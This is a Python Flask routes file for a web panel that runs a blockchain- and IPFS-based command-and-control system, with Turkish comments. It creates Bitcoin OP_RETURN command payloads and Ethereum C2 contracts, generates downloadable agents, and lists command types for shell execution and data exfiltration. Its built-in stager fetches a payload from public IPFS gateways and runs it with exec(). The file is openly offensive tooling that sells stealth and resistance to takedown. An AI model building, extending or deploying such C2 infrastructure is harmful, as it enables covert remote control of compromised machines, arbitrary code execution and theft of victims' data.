"""
Blockchain & Decentralized C2 Routes
Kapatılamayan sunucular için Flask routes
"""

from flask import Blueprint, render_template, request, jsonify, Response
import json
import base64
import secrets

blockchain_c2_bp = Blueprint('blockchain_c2', __name__, url_prefix='/blockchain-c2')

# Try to import the core module
BLOCKCHAIN_AVAILABLE = False
try:
    from tools.blockchain_c2 import (
        DecentralizedC2, BitcoinC2, IPFSC2, EthereumC2,
        BlockchainNetwork, CommandType
    )
    BLOCKCHAIN_AVAILABLE = True
    dc2_instance = DecentralizedC2()
except ImportError as e:
    print(f"[BLOCKCHAIN_C2] Import error: {e}")
    dc2_instance = None

# Default methods for fallback
DEFAULT_METHODS = {
    'bitcoin': {
        'name': 'Bitcoin OP_RETURN C2',
        'description': 'Bitcoin işlemlerinin OP_RETURN alanına komut gömme',
        'icon': '₿',
        'cost': '~0.0001 BTC/komut',
        'latency': '~10 dakika',
        'stealth': 'Çok Yüksek'
    },
    'dogecoin': {
        'name': 'Dogecoin C2',
        'description': 'Dogecoin ile ucuz ve hızlı komut aktarımı',
        'icon': '🐕',
        'cost': '~1 DOGE/komut',
        'latency': '~1 dakika',
        'stealth': 'Yüksek'
    },
    'ethereum': {
        'name': 'Ethereum Smart Contract',
        'description': 'Akıllı kontrat üzerinden C2 operasyonları',
        'icon': 'Ξ',
        'cost': 'Gas fee (~$1-10)',
        'latency': '~15 saniye',
        'stealth': 'Orta'
    },
    'ipfs': {
        'name': 'IPFS Payload Hosting',
        'description': 'Dağıtık dosya sistemi ile payload barındırma',
        'icon': '🌐',
        'cost': 'Ücretsiz',
        'latency': 'Anında',
        'stealth': 'Yüksek'
    }
}

COMMAND_TYPES = {
    'SHL': {'name': 'Shell Command', 'icon': '💻', 'description': 'Execute shell command'},
    'DWN': {'name': 'Download', 'icon': '📥', 'description': 'Download file'},
    'UPL': {'name': 'Upload', 'icon': '📤', 'description': 'Upload/exfiltrate data'},
    'SLP': {'name': 'Sleep', 'icon': '😴', 'description': 'Sleep for N seconds'},
    'EXF': {'name': 'Exfiltrate', 'icon': '📦', 'description': 'Exfiltrate data'},
    'KIL': {'name': 'Kill', 'icon': '💀', 'description': 'Terminate agent'},
    'UPD': {'name': 'Update', 'icon': '🔄', 'description': 'Update agent'},
    'IFS': {'name': 'IPFS Fetch', 'icon': '🌐', 'description': 'Fetch from IPFS'}
}


@blockchain_c2_bp.route('/')
def blockchain_index():
    """Blockchain C2 ana sayfası"""
    try:
        if dc2_instance:
            methods = dc2_instance.get_methods()
        else:
            methods = DEFAULT_METHODS
    except:
        methods = DEFAULT_METHODS
    
    return render_template('blockchain_c2.html', 
                          methods=methods,
                          command_types=COMMAND_TYPES,
                          available=BLOCKCHAIN_AVAILABLE)


@blockchain_c2_bp.route('/api/methods')
def get_methods():
    """Mevcut C2 methodlarını döndür"""
    try:
        if dc2_instance:
            methods = dc2_instance.get_methods()
        else:
            methods = DEFAULT_METHODS
        return jsonify(methods)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@blockchain_c2_bp.route('/api/bitcoin/create-command', methods=['POST'])
def create_bitcoin_command():
    """Bitcoin OP_RETURN komutu oluştur"""
    try:
        data = request.json
        cmd_type = data.get('command_type', 'SHL')
        payload = data.get('payload', 'whoami')
        encrypt = data.get('encrypt', True)
        
        if dc2_instance:
            result = dc2_instance.create_bitcoin_command(cmd_type, payload)
            return jsonify({
                'success': True,
                'command_id': result['command'].command_id,
                'op_return_hex': result['op_return_hex'],
                'op_return_base64': result['op_return_base64'],
                'size': result['size'],
                'network': result['network'],
                'tx_template': result['tx_template'],
                'instructions': [
                    '1. Bitcoin cüzdanınızda yeni işlem oluşturun',
                    '2. OP_RETURN çıktısı ekleyin',
                    f'3. Hex veriyi yapıştırın: {result["op_return_hex"]}',
                    '4. Minimum miktar gönderin (0.0001 BTC)',
                    '5. İşlemi onaylayın ve yayınlayın'
                ]
            })
        else:
            # Simulated response
            fake_hex = base64.b16encode(f"MNL{cmd_type}{payload}".encode()).decode()
            return jsonify({
                'success': True,
                'command_id': secrets.token_hex(4),
                'op_return_hex': fake_hex[:80],
                'op_return_base64': base64.b64encode(fake_hex.encode()).decode()[:60],
                'size': len(fake_hex) // 2,
                'network': 'btc_test',
                'instructions': ['Simulation mode - no actual blockchain interaction']
            })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@blockchain_c2_bp.route('/api/bitcoin/generate-agent', methods=['POST'])
def generate_bitcoin_agent():
    """Bitcoin C2 agent kodu üret"""
    try:
        data = request.json
        watch_address = data.get('watch_address', '1MonolithC2TestAddressXXXXXXXX')
        
        if dc2_instance:
            agent_code = dc2_instance.bitcoin_c2.generate_agent_code(watch_address)
        else:
            agent_code = f'''#!/usr/bin/env python3
# Bitcoin C2 Agent (Simulated)
# Watch Address: {watch_address}

import time

def main():
    print("Watching blockchain for commands...")
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
'''
        
        return jsonify({
            'success': True,
            'agent_code': agent_code,
            'watch_address': watch_address
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@blockchain_c2_bp.route('/api/ipfs/upload', methods=['POST'])
def ipfs_upload():
    """IPFS'e payload yükle"""
    try:
        data = request.json
        content = data.get('content', 'print("Hello from IPFS!")')
        filename = data.get('filename', 'payload.py')
        encrypt = data.get('encrypt', True)
        
        if dc2_instance:
            result = dc2_instance.create_ipfs_payload(content, filename, encrypt)
            return jsonify({
                'success': True,
                'cid': result['cid'],
                'filename': result['filename'],
                'size': result['size'],
                'gateways': result['gateways'],
                'stager_code': result['stager_code'],
                'encryption_key': result['encryption_key']
            })
        else:
            # Simulated
            fake_cid = "Qm" + secrets.token_hex(22)
            gateways = [
                f"https://ipfs.io/ipfs/{fake_cid}",
                f"https://cloudflare-ipfs.com/ipfs/{fake_cid}",
                f"https://dweb.link/ipfs/{fake_cid}"
            ]
            return jsonify({
                'success': True,
                'cid': fake_cid,
                'filename': filename,
                'size': len(content),
                'gateways': gateways,
                'stager_code': f'# IPFS Stager for {fake_cid}',
                'encryption_key': list(secrets.token_bytes(32)) if encrypt else None
            })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@blockchain_c2_bp.route('/api/ipfs/generate-stager', methods=['POST'])
def generate_ipfs_stager():
    """IPFS stager kodu üret"""
    try:
        data = request.json
        cid = data.get('cid', 'QmXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
        encryption_key = data.get('encryption_key')
        
        if dc2_instance:
            key = bytes(encryption_key) if encryption_key else None
            stager_code = dc2_instance.ipfs_c2.create_stager(cid, key)
        else:
            stager_code = f'''#!/usr/bin/env python3
"""IPFS Stager - CID: {cid}"""

import urllib.request

GATEWAYS = [
    "https://ipfs.io/ipfs/{cid}",
    "https://cloudflare-ipfs.com/ipfs/{cid}",
]

def fetch():
    for url in GATEWAYS:
        try:
            with urllib.request.urlopen(url) as r:
                return r.read()
        except:
            continue
    return None

if __name__ == "__main__":
    payload = fetch()
    if payload:
        exec(payload)
'''
        
        return jsonify({
            'success': True,
            'stager_code': stager_code,
            'cid': cid
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@blockchain_c2_bp.route('/api/ethereum/contract')
def get_ethereum_contract():
    """Ethereum C2 smart contract kodunu döndür"""
    try:
        if dc2_instance:
            contract_code = dc2_instance.ethereum_c2.generate_contract()
        else:
            contract_code = '''// Ethereum C2 Contract (Simulated)
pragma solidity ^0.8.0;

contract MonolithC2 {
    string public command;
    
    function postCommand(string memory cmd) public {
        command = cmd;
    }
}
'''
        
        return jsonify({
            'success': True,
            'contract_code': contract_code
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@blockchain_c2_bp.route('/api/ethereum/generate-agent', methods=['POST'])
def generate_ethereum_agent():
    """Ethereum C2 agent kodu üret"""
    try:
        data = request.json
        contract_address = data.get('contract_address', '0x1234567890abcdef1234567890abcdef12345678')
        rpc_url = data.get('rpc_url', 'https://sepolia.infura.io/v3/YOUR_KEY')
        
        if dc2_instance:
            agent_code = dc2_instance.ethereum_c2.generate_agent_code(contract_address, rpc_url)
        else:
            agent_code = f'''#!/usr/bin/env python3
# Ethereum C2 Agent (Simulated)
# Contract: {contract_address}

def main():
    print("Watching smart contract...")

if __name__ == "__main__":
    main()
'''
        
        return jsonify({
            'success': True,
            'agent_code': agent_code,
            'contract_address': contract_address
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@blockchain_c2_bp.route('/api/full-agent', methods=['POST'])
def generate_full_agent():
    """Çoklu C2 destekli tam ajan kodu üret"""
    try:
        data = request.json
        methods = data.get('methods', ['bitcoin', 'ipfs'])
        
        if dc2_instance:
            agent_code = dc2_instance.generate_full_agent(methods)
        else:
            agent_code = f'''#!/usr/bin/env python3
# Multi-Channel C2 Agent
# Methods: {", ".join(methods)}

def main():
    print("Multi-channel agent running...")

if __name__ == "__main__":
    main()
'''
        
        return jsonify({
            'success': True,
            'agent_code': agent_code,
            'methods': methods
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@blockchain_c2_bp.route('/api/download/agent')
def download_agent():
    """Agent kodunu indir"""
    try:
        methods = request.args.get('methods', 'bitcoin,ipfs').split(',')
        
        if dc2_instance:
            agent_code = dc2_instance.generate_full_agent(methods)
        else:
            agent_code = '# Simulated agent'
        
        return Response(
            agent_code,
            mimetype='text/plain',
            headers={'Content-Disposition': 'attachment; filename=blockchain_c2_agent.py'}
        )
    except Exception as e:
        return jsonify({'error': str(e)}), 500
